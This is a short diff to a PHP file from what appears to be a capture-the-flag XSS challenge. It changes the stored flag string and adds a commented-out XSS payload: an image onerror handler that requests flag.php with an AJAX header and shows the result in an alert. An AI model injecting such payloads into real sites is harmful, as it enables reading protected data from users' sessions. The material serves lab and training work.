@@ -3,7 +3,7 @@
 session_start();
 
 // Store the flag in a PHP variable - not visible in source
-$hidden_flag = "second_flag{xss_protection_bypassed}";
+$hidden_flag = "flag{xss_protection_bypassed}";
 
 // Only return the flag if the request is AJAX
 if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) && 
@@ -15,3 +15,12 @@ if(isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&
     exit();
 }
 ?>
+<!-- 
+    <img src=x onerror="
+        var xhr = new XMLHttpRequest();
+        xhr.open('GET', 'flag.php');
+        xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
+        xhr.onload = function() { alert(this.responseText); };
+        xhr.send();
+    ">
+-->
